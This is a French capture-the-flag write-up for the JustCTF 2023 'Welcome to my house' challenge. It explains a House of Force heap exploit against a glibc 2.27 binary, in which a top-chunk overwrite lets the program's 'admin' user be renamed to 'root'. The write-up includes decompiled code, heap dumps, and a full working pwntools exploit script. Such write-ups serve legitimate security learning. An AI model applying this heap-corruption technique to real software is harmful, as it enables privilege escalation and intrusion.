---
title: JustCTF 2023 - Welcome to my house
---

# Découverte du challenge

file
```bash
› file house_patched                 
house_patched: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter ./ld-2.27.so, for GNU/Linux 3.2.0, BuildID[sha1]=efb671ee78fcd896b0e79a07aa8cb08817475d31, not stripped
```

checksec
```
gef➤  checksec
Canary                        : ✓ 
NX                            : ✓ 
PIE                           : ✘ 
Fortify                       : ✘ 
RelRO                         : Partial
```

ldd
```
› ldd house_patched
	linux-vdso.so.1 (0x000078f5573e8000)
	libc.so.6 => ./libc.so.6 (0x000078f556c00000)
	./ld-2.27.so => /usr/lib64/ld-linux-x86-64.so.2 (0x000078f5573ea000)
```

glibc version
```
libc 2.27
```


En lancant le challenge on a la possibilité de faire : 
- Créer un utilisateur
- Lire le flag

```
[!]	Welcome in my house!	[!]

Actual user: admin

1. Create user
2. Read flag
3. Exit
```

On ne peut lire le flag seulement si on est l'utilisateur root, ici nous sommes admin.

```
>>  2

[-] You have to be root to read flag!
```

La commande "Create user" va faire : 
- Demander un nom d'utilisateur
- Demander un mot de passe
- Demander une taille de disque ??

En reversant cette méthode, on comprend que le programme alloue des chunks pour chaque variable qu'il va nous demander.   

Une partie intéressante ici : on contrôle la taille du chunk qui va être alloué pour l'espace disque.
De plus, le contenu de "password" est copié vers un chunk de taille 0x18 à la suite du chunk pour notre espace mémoire.
Pour finir, plusieurs heap overflow sont possibles. 

```c
int64_t create_user(){
	void* fsbase
    int64_t rax = *(fsbase + 0x28)
    printf("Enter username: ")
    int64_t ptr_username = malloc(0x19)
	__isoc99_scanf(&data_400c29, ptr_username)
    putchar(0xa)
    strcpy(malloc(0x18), ptr_username)
    printf("Enter password: ")
    int64_t ptr_password = malloc(0x18)
    __isoc99_scanf(&data_400c29, ptr_password)
    putchar(0xa)
    printf("Enter disk space: ")
    putchar(0xa)
    int64_t var_30
    __isoc99_scanf(&data_400c50, &var_30)
    malloc(var_30)
    int64_t rax_12 = malloc(0x18)
    strcpy(rax_12, ptr_password, rax_12)
    int64_t rax_15 = rax ^ *(fsbase + 0x28)
    if (rax_15 != 0)
	    rax_15 = __stack_chk_fail()
    return rax_15
}
```

**Idée** : Est ce qu'on pourrait utiliser la technique house of force pour écraser le top chunk, combler le vide qu'il y a entre notre position sur la heap et notre target, puis écraser le contenu de la target par "root" ?

Alors c'est partie !

Pour commencer, on utiliser le heap overflow pour écraser le top chunk et y placer la taille maximum (0xFFFFFFFFFFFFFFFF)

```pwndbg> vis

0x603000	0x0000000000000000	0x0000000000000251	........Q.......
...
0x603250	0x0000000000000000	0x0000000000000021	........!.......
0x603260	0x0000006e696d6461	0x0000000000000000	admin...........
0x603270	0x0000000000000000	0x0000000000000031	........1.......
0x603280	0x4141414141414141	0x4141414141414141	AAAAAAAAAAAAAAAA
0x603290	0x4141414141414141	0x4141414141414141	AAAAAAAAAAAAAAAA
0x6032a0	0x4141414141414141	0x4141414141414141	AAAAAAAAAAAAAAAA	 <-- Top chunk
```

Ensuite, on calcule la distance qui sépare notre notre variable target avec notre position actuelle dans la heap.
Notre binaire n'étant pas PIE, on trouve les adresses grâce à GDB.

```python
target = 0x603250
heap = 0x603300

def delta(x,y):
    return (0xffffffffffffffff - x) + y
dist = delta(heap, target+16)
```

Maintenant, on construit notre payload: 
- On remplit les userdata du chunk avec des données junk, puis on écrase le TOP CHUNK avec un très grand nombre (cela nous permettera de faire de très grosses allocations).
- La variable password doit être à 'root' car elle sera copié par la suite dans notre target
- Comme taille pour l'espace disque, on calcule la distance qu'il y a entre notre position dans la heap et notre target.

```python
create_user(b"A"*0x18 + p64(-1, signed=True), b"root", dist)
read_flag()
```

## Output

```bash
› python xpl.py
[+] Starting local process './house_patched': pid 602233
[*] Target: 0x603250
[*] Heap: 0x603300
[*] Dist: 0xffffffffffffff5f
FLAG{f4k3_fl4g_f0r_t3st1ng}

[*] Stopped process './house_patched' (pid 602233)
```

et voila !

## Full exploit
```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

context.update(arch='i386')
exe = './house_patched'

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

# create user
def cu(username, password, size):
    io.sendlineafter(b">>  ", b"1")
    io.sendlineafter(b"username:", username)
    io.sendlineafter(b"password:", password)
    io.sendlineafter(b"space:", str(size).encode())

# read flag
def rf():
    io.sendlineafter(b">>  ", b"2")
    io.recvline()
    print(io.recvline().decode())

def delta(x,y):
    return (0xffffffffffffffff - x) + y

gdbscript = '''
b create_user
'''.format(**locals())

target = 0x603250
heap = 0x603300
dist= delta(heap, target+16)

io = start()

info(f"Target: {hex(target)}")
info(f"Heap: {hex(heap)}")
info(f"Dist: {hex(dist)}")

cu(b"A"*0x18 + p64(-1, signed=True), b"root", dist)
rf()
```

